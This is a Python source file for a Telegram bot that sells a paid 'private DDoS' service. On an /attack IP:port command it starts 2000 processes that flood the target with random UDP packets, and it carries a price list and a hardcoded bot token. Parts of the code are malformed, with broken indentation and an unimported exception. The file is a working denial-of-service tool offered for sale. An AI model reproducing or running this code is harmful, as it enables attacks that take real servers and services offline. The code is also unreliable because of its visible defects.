import telebot
import socket
import multiprocessing
import os
import random
import time
import subprocess
import sys
import datetime
import logging
import socket

bot = telebot.TeleBot("7599785141:AAGokC8HZXRhjcvSkzd1jBSsinBoNSEX6NU", threaded=False)

AUTHORIZED_USERS = [7418099890]

#  track of user attacks
user_attacks = {}
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
def udp_flood(target_ip, target_port, stop_flag, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    start_time = time.time()
    while not stop_flag.is_set() and (time.time() - start_time < duration):
        try:
        data = os.urandom(1469)  # Use maximum packet size
        sock.sendto(data, (target_ip, target_port))
        packet_size = 1469
        data = os.urandom(packet_size)
    except Exception as e:
        logging.error(f"Error sending packets: {e}")
        break

def start_udp_flood(user_id, target_ip, target_port, duration=300):  # Default 5 minutes
    stop_flag = multiprocessing.Event()
    processes = []
    for _ in range(2000):  # Increase process count
    process = multiprocessing.Process(target=udp_flood, args=(target_ip, target_port, stop_flag, duration))
    process.start()
    processes.append(process)
    user_attacks[user_id] = (processes, stop_flag)
    bot.send_message(user_id, f"Attack started on {target_ip}:{target_port} for {duration} seconds.")
    
def stop_attack(user_id):
    if user_id in user_attacks:
        processes, stop_flag = user_attacks[user_id]
        stop_flag.set()
        for process in processes:
            process.join()

        del user_attacks[user_id]
        bot.send_message(user_id, "रोक दिया बे 😼")
    else:
        bot.send_message(user_id, "कोई अटैक नहीं मिला 😼")
#  Function to log commands and actions
def log_command(user_id, command):
    logging.info(f"User ID {user_id} executed command: {command}")
    
@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, ʙᴜʏ ғʀᴏᴍ @KaliaYtOwner

Vip :
-> Attack Time : 180 sᴇᴄ
> After Attack Limit :  ᴏɴᴇ ᴍɪɴᴜᴛᴇ
-> Concurrents Attack : 60

ᴘʀɪᴄᴇ ʟɪsᴛ :-\n
ᴏɴᴇ ᴅᴀʏ :- 40ʀs
ᴏɴᴇ ᴡᴇᴀᴋ :- 200
ᴏɴᴇ ᴍᴏɴᴛʜ :- 500'''
    bot.reply_to(message, response)    
@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name} ғᴏʟʟᴏᴡ ᴛʜɪs ʀᴜʟᴇs⚠️:

ᴏɴʟʏ ᴏɴᴇ ʀᴜʟᴇ ᴅᴏ ɴᴏᴛ sᴘᴀᴍ '''
    bot.reply_to(message, response)
    
@bot.message_handler(commands=['help'])
def show_help(message):
    help_text = '''ᴀᴠᴀɪʟᴀʙʟᴇ ᴄᴏᴍᴍᴀɴᴅ🐒
 /attack : ғᴏʀ ᴅᴅᴏs 😈. 
 /rules : ʀᴇᴀᴅ ᴄᴀʀᴇғᴜʟʟʏ🦁.
 /plan : ʙᴜʏ ғʀᴏᴍ 👇\nhttps://t.me/+vEq_y0x5tKNhMzFl
 '''
    bot.reply_to(message, help_text)
@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f"ᴍᴏsᴛ ᴡᴇʟᴄᴏᴍᴇ ɪɴ ᴘʀɪᴠᴀᴛᴇ ᴅᴅᴏs ᴜsᴇʀ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ➡️: /help  \n @KaliaYtOwner"
    bot.reply_to(message, response)
    
@bot.message_handler(commands=['attack'])
def attack(message):
    user_id = message.from_user.id
    log_command(user_id, '/attack')
    if user_id not in AUTHORIZED_USERS:
        bot.send_message(message.chat.id, "ऑनर से बात करो :- @KaliaYtOwner")
        return
    try:
        command = message.text.split()
        target = command[1].split(":")
        target_ip = target[0]
        target_port = int(target[1])
        start_udp_flood(user_id, target_ip, target_port)
    except (IndexError, ValueError):
        bot.send_message(message.chat.id, "𝐏𝐥𝐞𝐚𝐬𝐞 𝐏𝐫𝐨𝐯𝐢𝐝𝐞 :\n*/attack `𝐈𝐏`:`𝐏𝐎𝐑𝐓` 👈👀*\n`𝙴𝚡.-/𝚊𝚝𝚝𝚊𝚌𝚔 𝟸𝟶.𝟸𝟷𝟿.𝟽𝟼.𝟷𝟻𝟼:𝟸𝟻𝟽𝟺𝟺`")

@bot.message_handler(commands=['stop'])
def stop(message):
    user_id = message.from_user.id
    log_command(user_id, '/stop')
    if user_id not in AUTHORIZED_USERS:
        bot.send_message(message.chat.id, "🚫 Access Denied! Contact the owner for assistance: @KaliaYtOwner")
        return

    stop_attack(user_id)
def run_bot():
    while True:
        try:
            print("Bot is running...")
            bot.polling(none_stop=True, timeout=60)  # Add timeout to prevent long idle periods
        except ReadTimeout as rt:
            logging.error(f"ReadTimeout occurred: {rt}")
            print(f"ReadTimeout occurred: {rt}")
            time.sleep(15)  # Sleep before restarting the bot
        except Exception as e:
            logging.error(f"An error occurred: {e}")
            print(f"An error occurred: {e}")
            time.sleep(15)  # Sleep before restarting the bot

if __name__ == "__main__":
    run_bot()
